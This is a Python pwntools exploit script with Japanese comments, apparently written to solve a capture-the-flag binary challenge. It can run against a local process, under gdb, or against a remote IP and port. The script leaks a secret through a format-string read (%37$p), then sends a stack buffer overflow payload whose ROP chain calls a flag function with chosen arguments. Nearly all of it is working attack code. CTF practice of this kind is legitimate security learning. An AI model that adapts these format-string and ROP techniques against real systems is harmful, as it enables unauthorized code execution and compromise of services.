from pwn import *
import sys
import re

binary_file = './problem'
lib_file = './libflag.so'

context(arch="amd64", os="linux")
#context.binary = binary_file  #contextをバイナリから設定してくれる
context.terminal  = ['tmux', 'split-window', '-h']   # オプションなしでデバッグする時gdbがtmuxの新しいペインで起動するのでtmuxを起動しておく必要があるよ
# context.log_level = "DEBUG"
context.log_level = "INFO"
binary = ELF(binary_file)
lib = ELF(lib_file)

env = {}

brack_point_addr = "winner_record"

gdbscript = f'''
set exception-verbose on
set exception-debugger on
b {brack_point_addr}
c
'''

def create_socket():
	if len(sys.argv) == 2 and sys.argv[1] == '--local':
		# ローカルで攻撃
		tube = process([binary_file], env=env, stderr=sys.stderr)
	elif len(sys.argv) == 2 and sys.argv[1] == '--attach':
		# ローカルで攻撃してgdbをアタッチ
		tube = process([binary_file], env=env, stderr=sys.stderr)
		gdb.attach(tube, gdbscript=gdbscript)
	elif len(sys.argv) == 2 and sys.argv[1] == '--remote':
		# リモートに攻撃
		tube = remote("133.9.207.104", 12000)
	else:
		# デフォルトではローカルでgdbでデバッグ
		tube = gdb.debug([binary_file], aslr=False, env=env, gdbscript=gdbscript)

	return tube

def attack(io):
	## crack one_time_pad part
	f_string = '%37$p'

	ret = io.recvuntil(b"> ")
	io.sendline(f_string.encode())

	ret = io.recvuntil(b"> ").strip().decode()
	# print(ret)
	one_time_pad = int(re.search(r"hi!, 0x([0-9abcdef]+)", ret).groups()[0], 16) >> 32
	io.sendline(str(one_time_pad).encode())


	## call flag function
	flag_func_addr = binary.plt["flag"]
	rop_rdi_ret = 0x0040158b
	rop_rsi_r15_ret = 0x00401589

	arg1 = 0x6d317a307233
	arg2 = 0x62696e617279
	dummy = 0xdeadbeef

	buf_addr = 0x7fffffffeb90# 0x7fffffffeba0
	ret_addr = 0x7fffffffec18# 0x7fffffffec28
	padding = ret_addr - buf_addr


	payload  = b"A" * padding
	payload += p64(rop_rdi_ret)
	payload += p64(arg1)
	payload += p64(rop_rsi_r15_ret)
	payload += p64(arg2)
	payload += p64(dummy)
	payload += p64(flag_func_addr)
	io.sendline(payload)

	io.interactive()


if __name__ == '__main__':
	tube = create_socket()
	attack(tube)